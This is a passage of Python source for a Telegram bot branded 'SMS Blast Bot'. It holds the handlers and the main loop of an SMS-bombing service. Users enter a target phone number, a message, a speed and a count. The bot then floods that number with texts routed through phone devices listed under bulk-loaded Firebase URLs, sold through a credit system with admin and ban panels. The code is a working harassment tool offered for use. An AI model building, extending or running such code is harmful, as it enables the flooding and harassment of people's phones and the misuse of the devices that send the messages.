        [btn("ACTIVITY", "owner:activity", EMOJI_GEAR, "📜", style="primary"), btn("PRICING", "owner:pricing:menu", EMOJI_MONEY, "💳", style="primary")],
        [btn("REDEEM", "owner:redeem:menu", EMOJI_GIFT, "🎁", style="success"), btn("ADD CREDITS", "owner:credits:add", EMOJI_MONEY, "💰", style="success")],
        [btn("DEDUCT", "owner:credits:deduct", EMOJI_CROSS, "💰", style="danger"), btn("ADD ALL", "owner:add_all_credits", EMOJI_MONEY, "💰", style="success")],
        [btn("DEDUCT ALL", "owner:deduct_all_credits", EMOJI_CROSS, "💰", style="danger"), btn("FORCE JOIN", "owner:fj:menu", EMOJI_BELL, "🔗", style="primary")],
        [btn("SETTINGS", "owner:settings", EMOJI_GEAR, "⚙️", style="primary"), btn("SMS HISTORY", "owner:sms_history", EMOJI_STAR, "📋", style="primary")],
        [btn("EXPORT", "owner:export_script", EMOJI_GEAR, "📤", style="primary"), btn("PROTECT", "owner:protect", EMOJI_LOCK, "🔒", style="primary")],
        [btn("PROTECTED LIST", "owner:protected_list", EMOJI_LOCK, "🔐", style="primary"), btn("TRACK", "owner:track", EMOJI_STAR, "📊", style="primary")],
        [_apply_btn_style(InlineKeyboardButton(text=mode_btn[0], callback_data=mode_btn[1]), mode_style)],
        [btn("REFRESH", "owner:refresh", EMOJI_GEAR, "🔄", style="success")],
    ])

def admin_kb(d: dict) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("SEND SMS", "admin:send", EMOJI_ROCKET, "📤", style="success"), btn("VIDEOS", "owner:videos:menu", EMOJI_VIDEO, "📹", style="primary")],
        [btn("USERS", "admin:users:list", EMOJI_STAR, "👥", style="primary"), btn("API STATS", "admin:stats", EMOJI_STAR, "📊", style="primary")],
        [btn("BAN", "admin:ban", EMOJI_CROSS, "🚫", style="danger"), btn("UNBAN", "admin:unban:menu", EMOJI_CHECK, "✅", style="success")],
        [btn("BROADCAST", "admin:broadcast", EMOJI_BELL, "📢", style="primary")],
        [btn("REFRESH", "admin:refresh", EMOJI_GEAR, "🔄", style="success")],
    ])

def user_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("SEND SMS", "user:send", EMOJI_ROCKET, "📤", style="success")],
        [btn("VIDEOS", "user:random_video", EMOJI_VIDEO, "📹", style="primary"), btn("CREDITS", "user:credits", EMOJI_MONEY, "💰", style="primary")],
        [btn("REDEEM", "user:redeem", EMOJI_GIFT, "🎁", style="success"), btn("REFER", "user:refer", EMOJI_STAR, "👥", style="success")],
        [btn("STATS", "user:stats", EMOJI_STAR, "📊", style="primary"), btn("MY SMS", "user:sms_history", EMOJI_STAR, "📜", style="primary")],
        [btn("BUY", "user:pricing", EMOJI_MONEY, "💰", style="success")],
        [btn("TRANSFER", "user:transfer", EMOJI_MONEY, "💸", style="primary")],
        [btn("INFO", "user:info", EMOJI_GEAR, "ℹ️", style="primary")],
    ])

def videos_menu_kb(d: dict) -> InlineKeyboardMarkup:
    videos = d.get("videos", [])
    rows = [
        [btn("ADD VIDEO", "owner:videos:add", EMOJI_CHECK, "➕", style="success")],
        [btn("BULK DELETE ALL", "owner:videos:bulk_del", EMOJI_CROSS, "🗑", style="danger")]
    ]
    for idx, vid in enumerate(videos, 1):
        rows.append([btn(f"Video #{idx}", "noop", EMOJI_VIDEO, "📹", style="primary"), btn("REMOVE", f"owner:videos:del:{idx-1}", EMOJI_CROSS, "🗑", style="danger")])
    rows.append([btn("BACK", "owner:home", EMOJI_GEAR, "🔙", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def fb_menu_kb(d: dict, page: int = 0) -> InlineKeyboardMarkup:
    fbs = d.get("firebases", [])
    per_page = 8
    total_pages = max(1, (len(fbs) + per_page - 1) // per_page)
    page = max(0, min(page, total_pages - 1))
    
    start_idx = page * per_page
    end_idx = start_idx + per_page
    current_fbs = fbs[start_idx:end_idx]

    rows = [
        [
            btn("ADD FIREBASE", "owner:fb:add", EMOJI_CHECK, "➕", style="success"),
            btn("ADD VIA TXT", "owner:fb:add_file", EMOJI_CHECK, "📄", style="success")
        ]
    ]
    for fb in current_fbs:
        label = fb.get("label", fb["url"].replace("https://", ""))
        if len(label) > 16:
            label = label[:14] + ".."
        rows.append([
            btn(label, "noop", EMOJI_FIRE, "🔥", style="primary"),
            btn("REMOVE", f"owner:fb:del:{fb['id']}:{page}", EMOJI_CROSS, "🗑", style="danger")
        ])
    
    nav_row = []
    if page > 0:
        nav_row.append(btn("PREV", f"owner:fb:menu:{page-1}", EMOJI_GEAR, "◀️", style="primary"))
    if page < total_pages - 1:
        nav_row.append(btn("NEXT", f"owner:fb:menu:{page+1}", EMOJI_GEAR, "▶️", style="primary"))
    if nav_row:
        rows.append(nav_row)

    rows.append([btn("BACK", "owner:home", EMOJI_GEAR, "🔙", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def owners_menu_kb(d: dict) -> InlineKeyboardMarkup:
    owners = d.get("owners", [])
    rows = []
    if len(owners) < 6:
        rows.append([btn("ADD SUPER ADMIN", "owner:owners:add", EMOJI_CHECK, "➕", style="success")])
    for oid in owners:
        if oid == MAIN_OWNER:
            rows.append([btn(f"{oid} (MAIN)", "noop", EMOJI_CROWN, "👑", style="primary")])
        else:
            rows.append([btn(f"{oid}", "noop", EMOJI_CROWN, "🔱", style="primary"), btn("REMOVE", f"owner:owners:del:{oid}", EMOJI_CROSS, "🗑", style="danger")])
    rows.append([btn("BACK", "owner:home", EMOJI_GEAR, "🔙", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def admins_menu_kb(d: dict) -> InlineKeyboardMarkup:
    admins = d.get("admins", [])
    rows = [[btn("ADD ADMIN", "owner:admins:add", EMOJI_CHECK, "➕", style="success")]]
    for aid in admins:
        rows.append([btn(f"{aid}", "noop", EMOJI_SHIELD, "🛡", style="primary"), btn("REMOVE", f"owner:admins:del:{aid}", EMOJI_CROSS, "🗑", style="danger")])
    rows.append([btn("BACK", "owner:home", EMOJI_GEAR, "🔙", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def unban_menu_kb(d: dict, prefix: str) -> InlineKeyboardMarkup:
    banned = d.get("banned", [])
    rows = []
    for bid in banned:
        rows.append([btn(f"{bid}", f"{prefix}:unban:do:{bid}", EMOJI_CHECK, "🔓", style="success")])
    rows.append([btn("BACK", f"{prefix}:home", EMOJI_GEAR, "🔙", style="primary")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def users_list_kb(d: dict, prefix: str, page: int = 0) -> tuple[str, InlineKeyboardMarkup]:
    users = d.get("users", {})
    items = list(users.items())
    per = 10
    start = page * per
    chunk = items[start:start + per]
    approved = d.get("approved", [])
    banned = d.get("banned", [])

    lines = [f"👥 USERS ({len(items)} TOTAL)\n"]
    for uid_str, udata in chunk:
        uid = int(uid_str)
        name = udata.get("name", "Unknown")
        uses = udata.get("uses", 0)
        credits = udata.get("credits", 0)
        if uid in banned: status = "🚫"
        elif uid in approved: status = "✅"
        elif is_owner(uid, d): status = "👑"
        elif uid in d["admins"]: status = "🛡"
        else: status = "👤"
        lines.append(f"{status} <code>{uid}</code> — {name[:18]} | 💰{credits} | 📤{uses}")

    text = "\n".join(lines)
    rows = []
    nav = []
    if page > 0: nav.append(btn("PREV", f"{prefix}:users:pg:{page-1}", EMOJI_GEAR, "◀️", style="primary"))
    if start + per < len(items): nav.append(btn("NEXT", f"{prefix}:users:pg:{page+1}", EMOJI_GEAR, "▶️", style="primary"))
    if nav: rows.append(nav)
    rows.append([btn("BACK", f"{prefix}:home", EMOJI_GEAR, "🔙", style="primary")])
    return text, InlineKeyboardMarkup(inline_keyboard=rows)

def api_stats_text(d: dict) -> str:
    stats = d.get("stats", {})
    api_use = stats.get("api_usage", {})
    lines = [
        f"📊 API STATS\n",
        f"📤 Total Sent: {stats.get('total_sent', 0)}",
        f"❌ Total Failed: {stats.get('total_failed', 0)}\n",
        "━━━━━━━━━━━━━━━━━━",
        "Per Firebase:"
    ]
    if not api_use:
        lines.append("  😴 No usage yet.")
    for fb_id, fb_stats in list(api_use.items())[:10]:
        sent = fb_stats.get("sent", 0)
        failed = fb_stats.get("failed", 0)
        lines.append(f"🔥 {fb_id[:20]}\n   ✅ {sent} sent  ❌ {failed} failed")
    return "\n".join(lines)

R = Router()

# ========== COMMAND HANDLERS ==========
@R.message(Command("start"))
async def cmd_start(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    
    name = msg.from_user.full_name or "User"
    username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
    d = load()
    is_new = reg_user(uid, name, d)
    save(d)

    if is_new:
        log_text = (
            f"🆕 NEW USER JOINED\n\n"
            f"👤 Name: {name}\n"
            f"🆔 User ID: <code>{uid}</code>\n"
            f"🌐 Username: {username}\n"
            f"📅 Time: <code>{fmt_time(int(time.time()))}</code>"
        )
        asyncio.create_task(send_channel_log(msg.bot, log_text))

    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return

    await send_random_video(msg.bot, msg.chat.id, caption=f"🚀 Welcome to SMS Blast Bot!\nOwner: {SUPER_ADMIN_NAME}")

    if is_owner(uid, d):
        await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await msg.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    if is_banned(uid, d):
        await msg.answer(f"🚫 <b>You are banned!</b>\nContact admin.", parse_mode="HTML")
        return
    if not can_use(uid, d):
        await msg.answer(f"⛔ <b>Access denied!</b>\n\nContact owner: {SUPER_ADMIN_NAME}", parse_mode="HTML")
        return

    await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

# ========== USER: SEND SMS ==========
@R.callback_query(F.data == "user:send")
async def user_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not can_use(uid, d):
        await cq.answer("🚫 Access denied!", show_alert=True)
        return
    await state.set_state(S.send_number)
    await cq.message.edit_text(
        f"📞 Step 1/4 — Number\n\n"
        f"Enter phone number:\n<i>Example: +919876543210</i>",
        reply_markup=kb([("Cancel", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.send_number)
async def user_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"❌ Invalid number. Try again (e.g. +919876543210):", parse_mode="HTML")
        return
    
    if number in PROTECTED_NUMBERS:
        await msg.answer(f"🔒 <b>This number is protected!</b>", parse_mode="HTML")
        return
    
    await state.update_data(number=number)
    await state.set_state(S.send_message)
    await msg.answer(
        f"✅ Number: <code>{mask_number(number)}</code>\n\n"
        f"💬 Step 2/4 — Message\n\n"
        f"Type your message:",
        reply_markup=kb([("Cancel", "user:cancel")]),
        parse_mode="HTML"
    )

@R.message(S.send_message)
async def user_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.send_speed)
    await msg.answer(
        f"✅ Message saved!\n\n"
        f"⚡ Step 3/4 — Speed\n\n"
        f"Select sending speed:",
        reply_markup=speed_kb("user"),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"user:speed:fast", "user:speed:medium", "user:speed:slow"}))
async def user_speed_selected(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id

    speed_map = {
        "user:speed:fast": SPEED_FAST,
        "user:speed:medium": SPEED_MEDIUM,
        "user:speed:slow": SPEED_SLOW
    }
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"

    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.send_count)

    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)
    count = len(devices)

    credit_info = ""
    if not is_admin(uid, d) and not is_owner(uid, d):
        user_credits = get_user_credits(uid, d)
        credit_info = f"\n💰 Your Credits: <b>{user_credits}</b> (max {user_credits})\n"

    await cq.message.edit_text(
        f"{speed_label} selected!\n\n"
        f"📊 Step 4/4 — Count\n\n"
        f"🔥 Online APIs: <b>{count}</b>\n"
        f"📤 Capacity: <b>{count * 3}</b> SMS{credit_info}\n\n"
        f"How many SMS to send?",
        reply_markup=kb([("Cancel", "user:cancel")]),
        parse_mode="HTML"
    )

@R.message(S.send_count)
async def user_got_count(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1:
            raise ValueError
    except:
        await msg.answer(f"❌ Send a number (e.g. 5):", parse_mode="HTML")
        return
    await state.clear()

    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)

    if not is_admin(uid, d) and not is_owner(uid, d):
        current_credits = get_user_credits(uid, d)
        if current_credits <= 0:
            await msg.answer(
                f"❌ <b>You have 0 credits!</b>\n\n"
                f"💰 Contact admin to buy credits.",
                reply_markup=kb([("Home", "user:home")]),
                parse_mode="HTML"
            )
            return
        if count > current_credits:
            await msg.answer(f"⚠️ You only have {current_credits} credits! Sending {current_credits}...", parse_mode="HTML")
            count = current_credits

    devices = get_cached_devices()
    if not devices:
        devices = await get_all_online_devices(d)

    if not devices:
        await msg.answer(f"😴 No devices online! Try later.", reply_markup=kb([("Home", "user:home")]), parse_mode="HTML")
        return

    await run_sms_blast_with_progress(msg.bot, msg, uid, number, message_text, count, devices, send_speed)

# ========== SMS BLAST FUNCTION ==========
async def run_sms_blast_with_progress(bot: Bot, msg: Message, uid: int, number: str, message: str, count: int, devices: list, speed: float = SPEED_DEFAULT):
    await send_random_video(bot, msg.chat.id, caption=f"💣 SMS Bombing Started on {mask_number(number)}!")

    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            old_session = USER_SESSIONS[uid]
            if old_session.task and not old_session.task.done():
                await msg.answer(
                    f"⚠️ <b>A sending is already running!</b>\n"
                    f"Wait for it to finish.",
                    parse_mode="HTML"
                )
                return
            del USER_SESSIONS[uid]
        
        session = UserSession(uid)
        session.number = number
        USER_SESSIONS[uid] = session

    is_regular_user = not is_admin(uid, load()) and not is_owner(uid, load())
    current_credits = get_user_credits(uid, load()) if is_regular_user else None
    speed_label_display = "🚀 FAST" if speed == SPEED_FAST else "⚡ MEDIUM" if speed == SPEED_MEDIUM else "🐢 SLOW"

    try:
        progress_msg = await msg.answer(
            progress_text(0, 0, count, current_credits, speed_label_display),
            reply_markup=stop_send_kb(),
            parse_mode="HTML"
        )
    except Exception as e:
        log.error(f"Failed to send progress message: {e}")
        async with SESSIONS_LOCK:
            if uid in USER_SESSIONS:
                del USER_SESSIONS[uid]
        return

    sent_ok = 0
    sent_fail = 0
    msgs_left = count
    api_usage_delta = {}
    last_update_time = time.time()
    start_time = time.time()

    async def do_send():
        nonlocal sent_ok, sent_fail, msgs_left, last_update_time
        try:
            for device in devices:
                if msgs_left <= 0:
                    break
                
                async with session.lock:
                    if session.cancelled:
                        log.info(f"User {uid} stopped sending at {sent_ok + sent_fail}/{count}")
                        break
                
                # SAFE SIM EXTRACTION - FIXED NoneType ERROR
                try:
                    fb_id = device.get("fb_id", "unknown")
                    fb_url = device.get("fb_url", "")
                    dev_id = device.get("dev_id", "unknown")
                    sims = device.get("sims") or []
                    
                    sim_slots = []
                    if sims and isinstance(sims, list):
                        for s in sims:
                            if s and isinstance(s, dict):
                                sim_slots.append(s.get("simSlotIndex", 0))
                    if not sim_slots:
                        sim_slots = [0]
                        
                    device_quota = min(3, msgs_left)
                    device_sent = 0
                    
                    for sim in sim_slots:
                        async with session.lock:
                            if device_sent >= device_quota or msgs_left <= 0 or session.cancelled:
                                break
                        
                        ok = await send_sms_via_device(fb_url, dev_id, sim, number, message)
                        
                        async with session.lock:
                            if ok:
                                sent_ok += 1
                                device_sent += 1
                                msgs_left -= 1
                                
                                if is_regular_user:
                                    d_temp = load()
                                    deduct_credits(uid, 1, d_temp)
                                    d_temp["stats"]["total_sent"] = d_temp["stats"].get("total_sent", 0) + 1
                                    k = str(uid)
                                    if k in d_temp["users"]:
                                        d_temp["users"][k]["uses"] = d_temp["users"][k].get("uses", 0) + 1
                                    d_temp.setdefault("sms_history", {}).setdefault(str(uid), []).append({
                                        "number": number,
                                        "message": message[:100],
                                        "timestamp": int(time.time()),
                                        "status": "sent"
                                    })
                                    save(d_temp)
                            else:
                                sent_fail += 1
                                msgs_left -= 1
                            
                            if fb_id not in api_usage_delta:
                                api_usage_delta[fb_id] = {"sent": 0, "failed": 0}
                            api_usage_delta[fb_id]["sent" if ok else "failed"] += 1
                            
                            now = time.time()
                            if (now - last_update_time >= _PROGRESS_UPDATE_INTERVAL or
                                (sent_ok + sent_fail) == count or
                                session.cancelled):
                                
                                current_credits_live = get_user_credits(uid, load()) if is_regular_user else None
                                try:
                                    await progress_msg.edit_text(
                                        progress_text(sent_ok, sent_fail, count, current_credits_live, speed_label_display),
                                        reply_markup=stop_send_kb() if not session.cancelled else None,
                                        parse_mode="HTML"
                                    )
                                except TelegramBadRequest:
                                    pass
                                last_update_time = now
                        
                        await asyncio.sleep(speed)
                        
                except Exception as device_error:
                    log.error(f"Device processing error: {device_error}")
                    continue

        except Exception as e:
            log.error(f"Error in send loop for user {uid}: {e}")
        finally:
            async with session.lock:
                session.sent = sent_ok
                session.failed = sent_fail

    task = asyncio.create_task(do_send())
    session.task = task
    await task
    was_cancelled = session.cancelled

    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            del USER_SESSIONS[uid]

    if not is_regular_user:
        d_final = load()
        d_final["stats"]["total_sent"] = d_final["stats"].get("total_sent", 0) + sent_ok
        d_final["stats"]["total_failed"] = d_final["stats"].get("total_failed", 0) + sent_fail
        for fb_id, delta in api_usage_delta.items():
            d_final["stats"].setdefault("api_usage", {}).setdefault(fb_id, {"sent": 0, "failed": 0})
            d_final["stats"]["api_usage"][fb_id]["sent"] += delta["sent"]
            d_final["stats"]["api_usage"][fb_id]["failed"] += delta["failed"]
        k = str(uid)
        if k in d_final["users"]:
            d_final["users"][k]["uses"] = d_final["users"][k].get("uses", 0) + sent_ok
        d_final.setdefault("sms_history", {}).setdefault(str(uid), []).append({
            "number": number,
            "message": message[:100],
            "timestamp": int(time.time()),
            "status": "completed" if not was_cancelled else "stopped"
        })
        save(d_final)
    else:
        d_final = load()
        d_final["stats"]["total_failed"] = d_final["stats"].get("total_failed", 0) + sent_fail
        for fb_id, delta in api_usage_delta.items():
            d_final["stats"].setdefault("api_usage", {}).setdefault(fb_id, {"sent": 0, "failed": 0})
            d_final["stats"]["api_usage"][fb_id]["failed"] += delta["failed"]
        save(d_final)

    d_log = load()
    duration = int(time.time() - start_time)
    log_activity(d_log, "sms_blast", uid,
        f"Sent: {sent_ok}, Failed: {sent_fail}, Total: {count}, Duration: {fmt_duration(duration)}, Stopped: {was_cancelled}")
    save(d_log)

    try:
        user_chat_info = await bot.get_chat(uid)
        u_name = user_chat_info.full_name or "Unknown"
        u_uname = f"@{user_chat_info.username}" if user_chat_info.username else "No Username"
    except Exception:
        u_name = d_log.get("users", {}).get(str(uid), {}).get("name", "Unknown")
        u_uname = "No Username"

    chan_log = (
        f"🚀 SMS BLAST LOG\n"
        f"👤 User: {u_name}\n"
        f"🆔 ID: <code>{uid}</code>\n"
        f"📞 Target: <code>{number}</code>\n"
        f"✅ Sent: {sent_ok}\n"
        f"❌ Failed: {sent_fail}\n"
        f"⏱ Duration: {fmt_duration(duration)}\n"
        f"🛑 Status: {'STOPPED' if was_cancelled else 'COMPLETED'}"
    )
    asyncio.create_task(send_channel_log(bot, chan_log))

    if sent_fail == 0 and sent_ok > 0:
        icon = "✅"
    elif sent_ok > 0:
        icon = "⚠️"
    else:
        icon = "❌"

    credit_text = ""
    if is_regular_user:
        remaining = get_user_credits(uid, load())
        credit_text = f"\n💰 Credits Used: {sent_ok}\n💳 Remaining: {remaining}"

    stopped_text = f"\n🛑 User stopped mid-way!" if was_cancelled else ""
    duration_text = f"\n⏱ Duration: {fmt_duration(int(time.time() - start_time))}"

    if is_owner(uid, load()):
        back_btn = [btn("OWNER PANEL", "owner:home", EMOJI_GEAR, "🔙", style="primary")]
    elif is_admin(uid, load()):
        back_btn = [btn("ADMIN PANEL", "admin:home", EMOJI_GEAR, "🔙", style="primary")]
    else:
        back_btn = [btn("SEND ANOTHER", "user:send", EMOJI_ROCKET, "📤", style="success"), btn("HOME", "user:home", EMOJI_STAR, "🏠", style="primary")]

    try:
        await progress_msg.edit_text(
            f"{icon} SMS Blast Result{stopped_text}\n\n"
            f"📞 To: <code>{mask_number(number)}</code>\n"
            f"✅ Sent: {sent_ok}\n"
            f"❌ Failed: {sent_fail}\n"
            f"🔥 APIs used: {len(api_usage_delta)}"
            f"{duration_text}{credit_text}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[back_btn]),
            parse_mode="HTML"
        )
    except Exception as e:
        log.error(f"Failed to edit final progress message: {e}")

@R.callback_query(F.data == "user:stop_send")
async def user_stop_send(cq: CallbackQuery):
    uid = cq.from_user.id
    
    async with SESSIONS_LOCK:
        session = USER_SESSIONS.get(uid)
        if not session or (session.task and session.task.done()):
            await cq.answer("✅ No active sending!", show_alert=True)
            return
        session.cancelled = True
    
    await cq.answer("🛑 Stop signal sent!", show_alert=True)

# ========== OWNER: FIREBASE HANDLERS ==========
@R.callback_query(F.data.startswith("owner:fb:menu"))
async def owner_fb_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.clear()
    
    parts = cq.data.split(":")
    page = int(parts[3]) if len(parts) > 3 else 0
    
    await cq.message.edit_text(
        f"🔥 Firebase Manager\n\nTotal: {len(d.get('firebases', []))} Firebase(s)",
        reply_markup=fb_menu_kb(d, page),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:fb:add")
async def owner_fb_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_firebase)
    await cq.message.edit_text(
        f"🔥 Add Single Firebase\n\nSend Firebase URL:\n"
        f"<i>Format: Label | URL\nExample: MyApp | https://myapp.firebaseio.com</i>",
        reply_markup=kb([("Cancel", "owner:fb:menu:0")]),
        parse_mode="HTML"
    )

@R.message(S.add_firebase)
async def owner_fb_add_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    
    text = msg.text.strip()
    if "|" in text:
        parts = text.split("|", 1)
        label = parts[0].strip()
        url = parts[1].strip()
    else:
        url = text
        label = url.replace("https://", "").split(".")[0][:20]
    
    if not url.startswith("http"):
        await msg.answer(f"❌ URL must start with https://. Try again:", parse_mode="HTML")
        return
    
    url = url.rstrip("/")
    fbs = d.get("firebases", [])
    
    if any(fb["url"] == url for fb in fbs):
        await state.clear()
        await msg.answer(f"⚠️ Firebase already added!", reply_markup=fb_menu_kb(d), parse_mode="HTML")
        return
    
    fb_id = str(int(time.time()))
    fbs.append({
        "id": fb_id,
        "url": url,
        "label": label,
        "added_at": int(time.time())
    })
    d["firebases"] = fbs
    save(d)
    await state.clear()
    
    await msg.answer(
        f"✅ Firebase Added!\n\n🏷 {label}\n🔗 <code>{url}</code>",
        reply_markup=fb_menu_kb(load()),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:fb:add_file")
async def owner_fb_add_file_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_firebase_file)
    await cq.message.edit_text(
        f"🔥 Bulk Add Firebase via TXT\n\n"
        f"Upload a `.txt` file with Firebase URLs.\n\n"
        f"Supported Formats:\n"
        f"• <code>https://myapp.firebaseio.com</code>\n"
        f"• <code>Label | https://myapp.firebaseio.com</code>",
        reply_markup=kb([("Cancel", "owner:fb:menu:0")]),
        parse_mode="HTML"
    )

@R.message(S.add_firebase_file, F.document)
async def owner_fb_add_file_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    
    doc = msg.document
    if not doc.file_name.endswith('.txt'):
        await msg.answer(f"❌ Please upload a `.txt` file!", parse_mode="HTML")
        return
    
    file_info = await msg.bot.get_file(doc.file_id)
    downloaded_file = await msg.bot.download_file(file_info.file_path)
    content = downloaded_file.read().decode('utf-8', errors='ignore')
    
    lines = content.splitlines()
    fbs = d.get("firebases", [])
    existing_urls = {fb["url"].rstrip("/") for fb in fbs}
    
    added_count = 0
    skipped_count = 0
    processed_in_file = set()
    
    for line in lines:
        line = line.strip()
        if not line:
            continue
        
        if "|" in line:
            parts = line.split("|", 1)
            label = parts[0].strip()
            url = parts[1].strip()
        else:
            url = line
            label = url.replace("https://", "").replace("http://", "").split(".")[0][:20]
        
        if not (url.startswith("http://") or url.startswith("https://")):
            continue
        
        url = url.rstrip("/")
        
        if url in existing_urls or url in processed_in_file:
            skipped_count += 1
            continue
        
        processed_in_file.add(url)
        existing_urls.add(url)
        fb_id = str(int(time.time() * 1000) + random.randint(100, 999))
        fbs.append({
            "id": fb_id,
            "url": url,
            "label": label,
            "added_at": int(time.time())
        })
        added_count += 1
    
    d["firebases"] = fbs
    save(d)
    await state.clear()
    
    await msg.answer(
        f"✅ Firebase TXT Processed!\n\n"
        f"🔥 Added: {added_count}\n"
        f"⚠️ Skipped (Duplicates): {skipped_count}\n"
        f"📊 Total: {len(fbs)}",
        reply_markup=fb_menu_kb(load()),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:fb:del:"))
async def owner_fb_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    
    parts = cq.data.split(":")
    fb_id = parts[3]
    page = int(parts[4]) if len(parts) > 4 else 0
    
    d["firebases"] = [fb for fb in d["firebases"] if fb["id"] != fb_id]
    save(d)
    
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") != fb_id]
    FB_DEVICE_COUNTS.pop(fb_id, None)
    
    await cq.answer("🗑 Firebase Removed!")
    d = load()
    await cq.message.edit_text(
        f"🔥 Firebase Manager\n\nTotal: {len(d['firebases'])} Firebase(s)",
        reply_markup=fb_menu_kb(d, page),
        parse_mode="HTML"
    )

# ========== OWNER: VIDEOS ==========
@R.callback_query(F.data == "owner:videos:menu")
async def owner_videos_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    videos = d.get("videos", [])
    await cq.message.edit_text(
        f"📹 Video Manager\n\nTotal Videos: {len(videos)}",
        reply_markup=videos_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:videos:add")
async def owner_videos_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.add_video)
    await cq.message.edit_text(
        f"📹 Add Video\n\nSend a video or video File ID:",
        reply_markup=kb([("Cancel", "owner:videos:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_video)
async def owner_videos_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear()
        return
    video_file_id = None
    if msg.video:
        video_file_id = msg.video.file_id
    elif msg.document and msg.document.mime_type and msg.document.mime_type.startswith("video"):
        video_file_id = msg.document.file_id
    elif msg.text:
        video_file_id = msg.text.strip()
    if not video_file_id:
        await msg.answer(f"❌ Send a valid video.", parse_mode="HTML")
        return
    d.setdefault("videos", []).append(video_file_id)
    save(d)
    await state.clear()
    await msg.answer(
        f"✅ Video Saved!",
        reply_markup=videos_menu_kb(load()),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:videos:del:"))
async def owner_videos_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    idx = int(cq.data.split("owner:videos:del:", 1)[1])
    videos = d.get("videos", [])
    if 0 <= idx < len(videos):
        videos.pop(idx)
        d["videos"] = videos
        save(d)
        await cq.answer("🗑 Video Removed!")
    await owner_videos_menu(cq, state)

@R.callback_query(F.data == "owner:videos:bulk_del")
async def owner_videos_bulk_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    d["videos"] = []
    save(d)
    await cq.answer("🗑 All Videos Deleted!")
    await owner_videos_menu(cq, state)

@R.callback_query(F.data == "user:random_video")
async def user_trigger_video(cq: CallbackQuery):
    d = load()
    videos = d.get("videos", [])
    if not videos:
        await cq.answer("❌ No videos available!", show_alert=True)
        return
    await cq.answer("📹 Sending video...")
    await send_random_video(cq.bot, cq.message.chat.id, caption=f"📹 Enjoy your video!")

# ========== OWNER: SUPER ADMINS ==========
@R.callback_query(F.data == "owner:owners:menu")
async def owner_owners_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
